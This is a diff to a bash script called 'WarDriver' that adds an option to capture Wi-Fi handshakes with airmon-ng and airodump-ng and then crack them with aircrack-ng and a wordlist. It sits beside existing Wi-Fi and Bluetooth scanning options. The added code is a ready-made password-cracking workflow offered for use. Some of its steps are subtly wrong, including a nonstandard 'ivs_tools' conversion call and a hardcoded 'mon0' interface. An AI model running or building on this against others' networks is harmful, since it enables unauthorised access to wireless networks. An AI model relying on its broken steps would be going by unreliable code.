@@ -1,24 +1,23 @@
 #!/bin/bash
 
-# Developer: SirCryptic (NullSecurityTeam)
-# Info: WarDriver 1.0 (BETA)
+## Developer: SirCryptic (NullSecurityTeam)
+## Info: WarDriver 1.1 (BETA)
 clear
-banner="
+echo -e "
 ___       __             ________       _____                    
 __ |     / /_____ __________  __ \_________(_)__   ______________
 __ | /| / /_  __ /_  ___/_  / / /_  ___/_  /__ | / /  _ \_  ___/
-__ |/ |/ / / /_/ /_  /   _  /_/ /_  /   _  / __ |/ //  __/  /    
+__ |/ |/ / / /_/ /_ /    _ /_/ /_  /   _  /  __|/ //  __/  /    
 ____/|__/  \___/ /_/    /_____/ /_/    /_/  _____/ \___//_/     
-                                                                 
-"
+                                                                "
 
-echo "$banner"
+echo -e "
+1. Scan for available wireless networks
+2. Scan for available Bluetooth devices
+3. Capture wireless handshakes"
 
-echo "Choose an option:"
-echo "1. Scan for available wireless networks"
-echo "2. Scan for available Bluetooth devices"
 
-read -p "Enter your choice (1 or 2): " choice
+read -p "Enter your choice (1, 2, or 3): " choice
 
 if [ "$choice" == "1" ]; then
   echo "Scanning for available wireless networks..."
@@ -83,6 +82,38 @@ elif [ "$choice" == "2" ]; then
     fi
   done < available_bluetooth_devices.txt
 
+elif [ "$choice" == "3" ]; then
+  echo "Capturing wireless handshakes..."
+
+  # Prompt the user to select the wireless interface to use
+  echo "Available wireless interfaces:"
+  iw dev | awk '$1=="Interface"{print $2}'
+  read -p "Enter the name of the wireless interface to use: " interface
+
+  # Define the name of the output file
+  output_file="handshakes.pcap"
+
+  # Stop any processes that may interfere with the capture process
+  airmon-ng check kill
+
+  # Start monitoring the wireless interface
+  airmon-ng start $interface
+
+  # Use airodump-ng to capture handshakes
+  airodump-ng --output-format pcap --write $output_file mon0
+
+  # Stop monitoring the wireless interface
+  airmon-ng stop mon0
+
+  # Convert the captured data to a format that can be used by aircrack-ng
+  ivs_file="${output_file%.*}.ivs"
+  ivs_tools -i $output_file -o $ivs_file
+
+  # Prompt the user to enter the path to the wordlist file
+  read -p "Enter the path to the wordlist file: " wordlist_path
+
+  # Use aircrack-ng to crack any captured handshakes
+  aircrack-ng -w "$wordlist_path" "$ivs_file"
 else
-  echo "Invalid choice, please enter 1 or 2."
+  echo "Invalid choice, please enter 1, 2, or 3."
 fi
